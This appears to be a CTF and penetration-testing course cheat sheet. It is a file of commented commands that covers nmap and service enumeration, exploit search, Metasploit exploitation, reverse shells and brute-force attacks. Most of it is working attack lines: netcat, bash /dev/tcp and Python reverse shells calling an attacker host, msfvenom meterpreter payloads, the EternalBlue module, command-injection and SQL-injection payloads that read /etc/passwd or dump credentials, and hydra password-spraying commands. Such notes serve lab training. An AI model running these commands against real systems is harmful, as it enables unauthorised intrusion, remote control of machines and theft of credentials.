
#######################################################################
# CTF QUICK NOTES - SCANNING, ENUMERATION & EXPLOITATION
# Purpose:
# This file contains practical notes, commands, explanations,
# workflows, and CTF-oriented examples for pentesting labs and
# capture-the-flag environments.
#
# Format:
# - Every section contains:
#   1. Purpose
#   2. Why it is used
#   3. Commands
#   4. Workflow examples
#   5. CTF Q&A
#
# WARNING:
# Use ONLY in legal lab/CTF environments.
#######################################################################



#######################################################################
# 1. NMAP SCANNING (Class 24)
#######################################################################

# PURPOSE:
# Nmap is used to discover:
# - Live hosts
# - Open ports
# - Running services
# - Service versions
# - Operating systems
# - Misconfigurations
#
# WHY THIS IS USED:
# Enumeration starts with reconnaissance.
# Before exploitation, you need to know:
# - What services exist
# - Which ports are open
# - Which versions may be vulnerable
#
# Nmap is usually the FIRST tool used in a CTF.

#######################################################################
# COMMON COMMANDS
#######################################################################

# Service version detection + default scripts + all TCP ports
nmap -sV -sC -p- <target>

# WHY:
# -sV  -> Detects versions
# -sC  -> Runs default NSE scripts
# -p-  -> Scans all 65535 ports

# Scan top 20 UDP ports
nmap -sU --top-ports 20 <target>

# WHY:
# UDP services can expose DNS, SNMP, TFTP, etc.

# Vulnerability scripts on HTTP/HTTPS
nmap -p80,443 --script vuln <target>

# WHY:
# NSE vulnerability scripts can quickly identify known issues.

# Operating system detection
nmap -O <target>

# WHY:
# OS fingerprinting helps choose exploits later.



#######################################################################
# STEP-BY-STEP EXAMPLE
#######################################################################

# Step 1 - Find live hosts
nmap -sn 192.168.1.0/24

# WHY:
# -sn performs ping sweep only.
# Faster and avoids full port scans.

# Step 2 - Full enumeration
nmap -sV -sC -p- 192.168.1.100

# WHY:
# Finds all ports + services + default script info.

# Step 3 - Analyze results
# Example:
# 22 -> SSH
# 80 -> HTTP
# 445 -> SMB

# WHY:
# Each service becomes a possible attack vector.



#######################################################################
# CTF QUESTIONS & ANSWERS
#######################################################################

# Q:
# Scan TCP ports 1-1000 with service versions and save output.

nmap -p1-1000 -sV 10.10.10.10 -oN scan.txt

# WHY:
# -oN saves output for later analysis/reporting.


# Q:
# Enumerate SMB shares using NSE.

nmap -p445 --script smb-enum-shares <target>

# WHY:
# SMB often exposes anonymous shares in CTFs.


# Q:
# Find live hosts without port scanning.

nmap -sn 192.168.50.0/24

# WHY:
# Faster host discovery.



#######################################################################
# 2. ENUMERATING HTTP/HTTPS (Class 25-26)
#######################################################################

# PURPOSE:
# Discover:
# - Hidden directories
# - Admin panels
# - Backup files
# - Vulnerabilities
# - Technologies/frameworks
#
# WHY THIS IS USED:
# Web applications are extremely common in CTFs.
# Most flags are hidden in:
# - Hidden routes
# - Vulnerable parameters
# - Misconfigured applications

#######################################################################
# TOOLS
#######################################################################

# gobuster
# dirb
# nikto
# curl
# whatweb

#######################################################################
# COMMANDS
#######################################################################

# Directory brute forcing
gobuster dir -u http://<target> -w /usr/share/wordlists/dirb/common.txt

# WHY:
# Finds hidden directories/files.

# Vulnerability scanning
nikto -h http://<target>

# WHY:
# Detects outdated software and dangerous configs.

# Fetch robots.txt ignoring SSL errors
curl -k https://<target>/robots.txt

# WHY:
# robots.txt often leaks hidden paths.

# Technology fingerprinting
whatweb https://<target>

# WHY:
# Identifies CMS/framework/server.



#######################################################################
# STEP-BY-STEP EXAMPLE
#######################################################################

# View homepage source
curl http://10.10.10.10/

# WHY:
# HTML comments may leak credentials or paths.


# Find hidden directories
gobuster dir -u http://10.10.10.10 -w /usr/share/wordlists/dirb/common.txt

# WHY:
# Hidden admin/backup panels are common in CTFs.


# Run vulnerability scan
nikto -h http://10.10.10.10

# WHY:
# Finds outdated software quickly.



#######################################################################
# CTF QUESTIONS & ANSWERS
#######################################################################

# Q:
# Enumerate HTTPS hidden directories using secrets.txt

gobuster dir -u https://example.com -w secrets.txt -k

# WHY:
# -k ignores SSL certificate validation.


# Q:
# Quickly test login page for SQL injection

sqlmap -u "http://target/login.php?user=admin&pass=test" --batch

# WHY:
# sqlmap automates SQLi testing/exploitation.


# Alternative:
nikto -h http://target


# Q:
# Find allowed HTTP methods

curl -X OPTIONS https://target.com -i

# WHY:
# Dangerous methods like PUT/DELETE may be enabled.


# Alternative:
nmap --script http-methods -p80 target



#######################################################################
# 3. ENUMERATING SMB (Class 27)
#######################################################################

# PURPOSE:
# SMB enumeration discovers:
# - Shared folders
# - Users
# - Groups
# - Permissions
# - OS details
#
# WHY THIS IS USED:
# SMB misconfigurations are common in Windows labs.
# Anonymous shares often leak:
# - Passwords
# - Configs
# - Flags

#######################################################################
# COMMANDS
#######################################################################

# List shares anonymously
smbclient -L //<target> -N

# WHY:
# -N means no password.

# Full SMB enumeration
enum4linux -a <target>

# WHY:
# Collects users, shares, groups, policies, OS info.

# NSE SMB scripts
nmap --script smb-enum-shares,smb-enum-users -p445 <target>

# WHY:
# Automated SMB discovery via Nmap.

# Connect to share
smbclient //<target>/<share> -N

# WHY:
# Allows downloading/uploading files.



#######################################################################
# STEP-BY-STEP EXAMPLE
#######################################################################

# Find shares
smbclient -L //10.10.10.10 -N

# WHY:
# Anonymous shares are frequent in beginner CTFs.


# Enumerate users/groups
enum4linux -a 10.10.10.10

# WHY:
# Usernames help later brute force attacks.


# Access share
smbclient //10.10.10.10/public -N

# Download file
get flag.txt

# WHY:
# Flags are often stored in public shares.



#######################################################################
# CTF QUESTIONS & ANSWERS
#######################################################################

# Enumerate SMB shares anonymously
smbclient -L //192.168.1.10 -N


# List users
enum4linux -U 192.168.1.10


# Check SMB signing
nmap --script smb-security-mode -p445 192.168.1.10

# WHY:
# Disabled signing can allow relay attacks.



#######################################################################
# 4. ENUMERATING SSH (Class 28)
#######################################################################

# PURPOSE:
# SSH enumeration identifies:
# - Versions
# - Authentication methods
# - Weak crypto
# - Valid users
#
# WHY THIS IS USED:
# SSH is commonly used for:
# - Initial access
# - Lateral movement
# - Privilege escalation

#######################################################################
# COMMANDS
#######################################################################

# Verbose SSH connection
ssh -v <user>@<target>

# WHY:
# Shows auth methods and banners.


# Grab SSH banner
nc <target> 22

# WHY:
# Banner reveals OpenSSH version.


# Audit weak algorithms
ssh-audit <target>

# WHY:
# Finds insecure ciphers and key exchanges.


# Brute force SSH
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://<target>

# WHY:
# Weak passwords are common in labs/CTFs.



#######################################################################
# STEP-BY-STEP EXAMPLE
#######################################################################

# Banner grab
nc 10.10.10.10 22

# Example:
# SSH-2.0-OpenSSH_7.4

# WHY:
# Version can be researched for vulnerabilities.


# Crypto audit
ssh-audit 10.10.10.10

# WHY:
# Weak algorithms may exist.


# Brute force
hydra -L users.txt -P pass.txt ssh://10.10.10.10

# WHY:
# Credential attacks are common in CTFs.



#######################################################################
# CTF QUESTIONS & ANSWERS
#######################################################################

# Check supported auth methods
ssh -v -p 2222 dummy@target.com 2>&1 | grep "authentications that can continue"


# Check if root password login allowed
ssh -o PreferredAuthentications=password root@target

# WHY:
# If password prompt appears, root login may be enabled.


# Username enumeration
hydra -L usernames.txt -p x -e ns -t 1 ssh://target

# WHY:
# Response timing may reveal valid users.



#######################################################################
# 5. RESEARCHING POTENTIAL VULNERABILITIES (Class 29)
#######################################################################

# PURPOSE:
# Match discovered software versions with public exploits.
#
# WHY THIS IS USED:
# Enumeration alone is useless unless:
# - You identify vulnerabilities
# - You map versions to CVEs/exploits

#######################################################################
# TOOLS
#######################################################################

# searchsploit
# exploit-db
# NVD
# MITRE CVE database

#######################################################################
# COMMANDS
#######################################################################

# Search exploit
searchsploit "OpenSSH 7.4"

# WHY:
# Finds known public exploits.


# Mirror exploit locally
searchsploit -m 41154

# WHY:
# Copies exploit into current directory.


# Search by CVE
searchsploit --cve 2021-44228

# WHY:
# Fast CVE lookup.



#######################################################################
# STEP-BY-STEP EXAMPLE
#######################################################################

# Detect version
nmap -sV target

# Example:
# Apache 2.4.49

# Search exploit
searchsploit Apache 2.4.49

# WHY:
# Apache 2.4.49 had path traversal CVE.


# Download exploit
searchsploit -m 50383



#######################################################################
# CTF QUESTIONS & ANSWERS
#######################################################################

# SMBv1 exploits
searchsploit smb v1

# Alternative
searchsploit eternalblue


# Linux kernel 4.4.0 privilege escalation
searchsploit linux kernel 4.4.0

# WHY:
# Dirty Cow often appears.


# Mirror exploit
searchsploit -m 48929



#######################################################################
# 6. VULNERABILITY SCANNING WITH NESSUS (Class 30-31)
#######################################################################

# PURPOSE:
# Automated vulnerability discovery.
#
# WHY THIS IS USED:
# Nessus quickly identifies:
# - CVEs
# - Misconfigurations
# - Weak SSL
# - Missing patches

#######################################################################
# STEP-BY-STEP EXAMPLE
#######################################################################

# Start Nessus service
systemctl start nessusd

# Open:
# https://localhost:8834

# WHY:
# Nessus web UI runs on 8834.


# Create scan
# Basic Network Scan
# Add target IP
# Launch scan

# WHY:
# Generates categorized findings.


# Export report
# PDF or HTML

# WHY:
# Useful for documentation/proof.



#######################################################################
# CLI COMMANDS
#######################################################################

nessuscli scan --list

nessuscli scan --launch <scan_uuid>



#######################################################################
# CTF QUESTIONS & ANSWERS
#######################################################################

# Q:
# Best policy for web application testing?

# A:
# "Web Application Tests"


# Q:
# SSL Self-Signed Certificate critical?

# A:
# Usually informational in labs, warning in production.


# Q:
# Update Nessus plugins

/opt/nessus/sbin/nessuscli update



#######################################################################
# 7. REVERSE SHELLS VS BIND SHELLS (Class 32)
#######################################################################

# PURPOSE:
# Gain remote shell access.
#
# WHY THIS IS USED:
# Exploitation usually aims to obtain command execution.

#######################################################################
# TYPES
#######################################################################

# Reverse Shell:
# Target connects BACK to attacker.

# WHY:
# Bypasses inbound firewall restrictions.


# Bind Shell:
# Target opens listener.

# WHY:
# Useful when outbound traffic blocked.



#######################################################################
# REVERSE SHELL EXAMPLE
#######################################################################

# Attacker listener
nc -lvp 4444

# Victim connects back
nc <attacker_ip> 4444 -e /bin/bash



#######################################################################
# BIND SHELL EXAMPLE
#######################################################################

# Victim listener
nc -lvp 4444 -e /bin/bash

# Attacker connects
nc <target_ip> 4444



#######################################################################
# STEP-BY-STEP REVERSE SHELL
#######################################################################

# Listener
nc -lnvp 1337

# Reverse shell
bash -c 'bash -i >& /dev/tcp/10.0.0.1/1337 0>&1'

# WHY:
# Gives interactive shell access.



#######################################################################
# CTF QUESTIONS & ANSWERS
#######################################################################

# Outbound-only victim?
# Use reverse shell over allowed port like 443.


# Python reverse shell
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'


# Open 4444 waiting for connection?
# Likely bind shell.



#######################################################################
# 8. STAGED VS NON-STAGED PAYLOADS (Class 33)
#######################################################################

# PURPOSE:
# Understand payload delivery mechanisms.
#
# WHY THIS IS USED:
# Payload size and reliability matter during exploitation.

#######################################################################
# STAGED PAYLOAD
#######################################################################

# Small stager downloads larger payload later.

# WHY:
# Useful when exploit space limited.

msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe -o staged.exe



#######################################################################
# NON-STAGED PAYLOAD
#######################################################################

# Entire payload sent at once.

# WHY:
# More stable but larger.

msfvenom -p windows/meterpreter_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe -o nonstaged.exe



#######################################################################
# CTF QUESTIONS & ANSWERS
#######################################################################

# Small exploit buffer?
# Use staged payload.


# How identify staged payload?
# Example:
# windows/shell/reverse_tcp

# Non-staged:
# windows/shell_reverse_tcp


# Generate Linux non-staged Python payload
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f python -o rev.py



#######################################################################
# 9. GAINING ROOT WITH METASPLOIT (Class 34)
#######################################################################

# PURPOSE:
# Automate exploitation and post-exploitation.
#
# WHY THIS IS USED:
# Metasploit simplifies:
# - Exploit delivery
# - Session handling
# - Privilege escalation
# - Post-exploitation modules

#######################################################################
# WORKFLOW
#######################################################################

# Start Metasploit
msfconsole

# Search exploit
search eternalblue

# Use exploit
use exploit/windows/smb/ms17_010_eternalblue

# Configure target
set RHOSTS <target>

# Configure payload
set PAYLOAD windows/x64/meterpreter/reverse_tcp

# Configure listener
set LHOST <attacker_ip>

# Run exploit
run

# Attempt privilege escalation
getsystem

# Suggest local exploits
run post/multi/recon/local_exploit_suggester



#######################################################################
# MANUAL HANDLER EXAMPLE
#######################################################################

use exploit/multi/handler

set payload linux/x64/meterpreter/reverse_tcp

set LHOST 10.0.0.1

exploit -j

# Interact with session
sessions -i 1

# Attempt SYSTEM/root
getsystem



#######################################################################
# CTF QUESTIONS & ANSWERS
#######################################################################

# Elevate to SYSTEM
getsystem


# Suggest local privilege escalation
run post/multi/recon/local_exploit_suggester


# Background session
background

# Search privilege escalation modules
search suggester



#######################################################################
# 10. MANUAL EXPLOITATION (Class 35)
#######################################################################

# PURPOSE:
# Exploit vulnerabilities manually without frameworks.
#
# WHY THIS IS USED:
# Understanding manual exploitation:
# - Improves skill
# - Helps in restricted environments
# - Builds deeper understanding

#######################################################################
# SQL INJECTION
#######################################################################

# Boolean-based test
curl "http://target/page?id=1 AND 1=1"

curl "http://target/page?id=1 AND 1=2"

# WHY:
# Different responses indicate possible SQLi.


# Data extraction
curl "http://target/page?id=1 UNION SELECT username,password FROM users"



#######################################################################
# COMMAND INJECTION
#######################################################################

curl "http://target/ping?ip=127.0.0.1; id"

# WHY:
# App may execute shell commands unsafely.



#######################################################################
# BUFFER OVERFLOW
#######################################################################

python -c 'print "A"*500' | ./vuln

# WHY:
# Crashes app to identify overflow conditions.



#######################################################################
# CTF QUESTIONS & ANSWERS
#######################################################################

# Read /etc/passwd
ping?ip=8.8.8.8; cat /etc/passwd


# Manual SQLi login bypass
user=admin' OR '1'='1&pass=any


# Compile exploit
searchsploit -m 45010

gcc 45010.c -o exploit

./exploit



#######################################################################
# 11. BRUTE FORCE ATTACKS (Class 36)
#######################################################################

# PURPOSE:
# Guess credentials automatically.
#
# WHY THIS IS USED:
# Weak passwords are extremely common in labs and CTFs.

#######################################################################
# TOOLS
#######################################################################

# hydra
# medusa
# john
# crunch

#######################################################################
# SSH BRUTE FORCE
#######################################################################

hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.10

# WHY:
# Tests many passwords rapidly.



#######################################################################
# HTTP POST BRUTE FORCE
#######################################################################

hydra -L users.txt -P pass.txt 10.10.10.10 http-post-form "/login.php:user=^USER^&pass=^PASS^:F=Invalid"

# WHY:
# Automates login attempts against forms.



#######################################################################
# GENERATE WORDLIST
#######################################################################

crunch 6 8 123abc -o wordlist.txt

# WHY:
# Custom wordlists improve success.



#######################################################################
# STEP-BY-STEP
#######################################################################

hydra -l root -P common_passwords.txt ssh://192.168.1.10 -t 4

# Found:
# root:password123

ssh root@192.168.1.10



#######################################################################
# CTF QUESTIONS & ANSWERS
#######################################################################

# FTP brute force
hydra -l anonymous -P pws.txt ftp://target


# SMB brute force with Medusa
medusa -h target -U users.txt -p pass123 -M smbnt


# Crack MD5 hash
echo "5f4dcc3b5aa765d61d8327deb882cf99" > hash.txt

john --format=raw-md5 --wordlist=rockyou.txt hash.txt

# Result:
# password



#######################################################################
# 12. CREDENTIAL STUFFING & PASSWORD SPRAYING (Class 37)
#######################################################################

# PURPOSE:
# Reuse leaked credentials/passwords.
#
# WHY THIS IS USED:
# Password reuse is extremely common.

#######################################################################
# CREDENTIAL STUFFING
#######################################################################

# Use user:password pairs
hydra -C creds.txt ssh://target -v

# WHY:
# Tests known leaked credentials.



#######################################################################
# PASSWORD SPRAYING
#######################################################################

# One password against many users
hydra -L users.txt -p 'Winter2024!' ssh://target

# WHY:
# Avoids account lockouts.



#######################################################################
# STEP-BY-STEP
#######################################################################

# Create users.txt from enumeration

# Slow spray to avoid lockout
hydra -L users.txt -p 'Company123!' ssh://10.10.10.10 -t 1

# Example result:
# jdoe:Company123!



#######################################################################
# CTF QUESTIONS & ANSWERS
#######################################################################

# Why use one password in spraying?
# To avoid account lockouts.


# Convert emails to creds format
awk '{print $0":Spring2025"}' emails.txt > creds.txt

# Then:
hydra -C creds.txt ...


# Cracked hashes enable what?
# Credential stuffing.
#######################################################################

#!/bin/bash

#######################################################################
# BRUTE FORCE WITH METASPLOIT (CTF CLASS)
#######################################################################

# PURPOSE:
# Metasploit can automate brute force attacks against services like:
# - SSH
# - FTP
# - Telnet
# - SMB
# - HTTP login forms (via auxiliary modules)
#
# WHY THIS IS USED:
# Instead of manually trying passwords, Metasploit:
# - Automates login attempts
# - Tracks valid credentials
# - Integrates directly into exploitation workflow
# - Saves time during CTF enumeration phase

#######################################################################
# GENERAL METASPLOIT BRUTE FORCE FLOW
#######################################################################

# Step 1 - Start Metasploit
msfconsole

# WHY:
# Loads exploitation framework and module database.

# Step 2 - Search brute force module
search ssh_login

# WHY:
# Metasploit uses "auxiliary" modules for brute force tasks.

# Step 3 - Select module
use auxiliary/scanner/ssh/ssh_login

# WHY:
# This module performs SSH credential brute force.

#######################################################################
# SSH BRUTE FORCE (MOST COMMON IN CTFs)
#######################################################################

# Select module
use auxiliary/scanner/ssh/ssh_login

# Set target
set RHOSTS 10.10.10.10

# Set username or list
set USERNAME root
# OR
set USER_FILE users.txt

# Set password or list
set PASSWORD password123
# OR
set PASS_FILE /usr/share/wordlists/rockyou.txt

# Set threads (speed control)
set THREADS 4

# Run attack
run

#######################################################################
# WHY EACH OPTION IS USED
#######################################################################

# RHOSTS:
# Target machine IP or subnet.

# USERNAME / USER_FILE:
# Defines which accounts to test.

# PASSWORD / PASS_FILE:
# Password list for guessing.

# THREADS:
# Controls speed of attack (higher = faster but noisy).

#######################################################################
# RESULT HANDLING
#######################################################################

# If successful, Metasploit outputs:
# [+] 10.10.10.10:22 - Success: root:password123

# WHY:
# Valid credentials are automatically stored in:
# - Metasploit database
# - credentials table

# You can view saved creds:
creds

#######################################################################
# FTP BRUTE FORCE MODULE
#######################################################################

use auxiliary/scanner/ftp/ftp_login

set RHOSTS 10.10.10.10
set USER_FILE users.txt
set PASS_FILE rockyou.txt
set THREADS 4

run

#######################################################################
# WHY FTP BRUTE FORCE IS USED
#######################################################################

# FTP often has:
# - Anonymous login misconfigurations
# - Weak password policies
# - Default credentials

#######################################################################
# SMB BRUTE FORCE MODULE
#######################################################################

use auxiliary/scanner/smb/smb_login

set RHOSTS 10.10.10.10
set USER_FILE users.txt
set PASS_FILE pass.txt
set THREADS 4

run

#######################################################################
# WHY SMB IS IMPORTANT
#######################################################################

# SMB brute force is useful because:
# - Windows networks often reuse passwords
# - Domain credentials may be weak
# - It can lead to lateral movement

#######################################################################
# HTTP LOGIN BRUTE FORCE (FORM BASED)
#######################################################################

use auxiliary/scanner/http/http_login

set RHOSTS 10.10.10.10
set TARGETURI /login.php
set USERNAME admin
set PASS_FILE rockyou.txt

run

#######################################################################
# WHY HTTP BRUTE FORCE IS USED
#######################################################################

# Web login panels are common CTF entry points:
# - /admin
# - /login
# - /dashboard
# Weak passwords are frequently used.

#######################################################################
# BEST PRACTICES IN CTFs
#######################################################################

# 1. Always enumerate users first
# WHY: reduces brute force scope

# 2. Use small wordlists first
# WHY: faster and less noisy

# 3. Increase THREADS carefully
# WHY: too high = lockout or detection

# 4. Check for lockout policies
# WHY: avoids wasting attempts

#######################################################################
# COMMON CTF QUESTIONS & ANSWERS
#######################################################################

# Q: Which Metasploit module is used for SSH brute force?
# A: auxiliary/scanner/ssh/ssh_login

# Q: Where are valid credentials stored?
# A: Metasploit database (creds command)

# Q: Why use THREADS?
# A: To speed up login attempts

# Q: What happens after success?
# A: Credentials are automatically saved and usable for exploits

#######################################################################
# QUICK WORKFLOW SUMMARY
#######################################################################

# msfconsole
# search ssh_login
# use auxiliary/scanner/ssh/ssh_login
# set RHOSTS <target>
# set USER_FILE users.txt
# set PASS_FILE rockyou.txt
# set THREADS 4
# run

#######################################################################
```